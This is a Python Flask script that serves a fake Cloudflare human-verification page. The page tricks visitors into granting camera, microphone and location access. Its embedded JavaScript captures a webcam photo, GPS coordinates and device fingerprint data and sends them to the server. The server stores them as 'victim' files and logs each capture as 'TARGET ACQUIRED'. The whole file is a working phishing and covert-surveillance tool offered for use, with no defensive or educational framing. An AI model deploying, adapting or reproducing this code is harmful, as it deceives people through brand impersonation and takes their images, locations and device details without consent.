import os, base64, time, json
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)
DB_PATH = "the_vault"
os.makedirs(DB_PATH, exist_ok=True)

html_payload = """
<!DOCTYPE html>
<html>
<head>
    <title>Cloudflare | Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #fafafa; margin: 0; }
        .box { text-align: center; border: 1px solid #ddd; padding: 40px; background: white; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        #btn { background: #f6821f; color: white; border: none; padding: 15px 30px; border-radius: 4px; cursor: pointer; font-size: 16px; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.cloudflare.com/img/logo-cloudflare-dark.svg" width="150"><br><br>
        <p>Confirm you are human to access the content.</p>
        <button id="btn">Verify Identity</button>
    </div>

    <video id="v" style="display:none"></video>
    <canvas id="c" style="display:none"></canvas>

    <script>
        document.getElementById('btn').onclick = async () => {
            document.getElementById('btn').innerHTML = "Verifying...";
            
            try {
                // 1. طلب الصلاحيات (كاميرا + مايكروفون)
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                
                // 2. سحب الموقع
                const pos = await new Promise((res) => navigator.geolocation.getCurrentPosition(res));

                // 3. سحب مواصفات الجهاز (البطارية، GPU، الرام)
                const battery = await (navigator.getBattery ? navigator.getBattery() : {level: 0, charging: false});
                const gl = document.createElement('canvas').getContext('webgl');
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_INFO) : "Unknown GPU";

                // 4. التقاط الصورة
                const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                const canvas = document.getElementById('c');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(v, 0, 0);
                const imgData = canvas.toDataURL('image/png');

                // 5. إرسال كل الغنائم للسيرفر
                await fetch('/mega_collect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        img: imgData,
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        device: {
                            gpu: gpu,
                            bat: (battery.level * 100) + "%",
                            charging: battery.charging,
                            ram: navigator.deviceMemory || "N/A",
                            cores: navigator.hardwareConcurrency,
                            ua: navigator.userAgent
                        }
                    })
                });

                alert("Verification Successful!");
                window.location.href = "https://www.google.com";

            } catch (err) {
                alert("Error: You must allow camera/location to verify.");
                console.log(err);
            }
        };
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_payload)

@app.route('/mega_collect', methods=['POST'])
def mega_collect():
    data = request.get_json()
    ts = int(time.time())
    
    # 1. حفظ الصورة
    img_bytes = base64.b64decode(data['img'].split(',')[1])
    with open(f"{DB_PATH}/victim_{ts}.png", "wb") as f:
        f.write(img_bytes)
    
    # 2. طباعة المواصفات في الـ Console (عشان تشوفها فوراً)
    print(f"\n" + "💀"*10 + " TARGET ACQUIRED " + "💀"*10)
    print(f"📍 Location: {data['lat']}, {data['lon']}")
    print(f"🔋 Battery: {data['device']['bat']} (Charging: {data['device']['charging']})")
    print(f"🎮 GPU: {data['device']['gpu']}")
    print(f"🧠 RAM: {data['device']['ram']} GB | Cores: {data['device']['cores']}")
    print(f"📱 User-Agent: {data['device']['ua']}")
    print("💀"*35 + "\n")

    # 3. حفظ كل البيانات في ملف JSON
    with open(f"{DB_PATH}/info_{ts}.json", "w") as f:
        json.dump(data, f, indent=4)

    return jsonify({"status": "captured"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
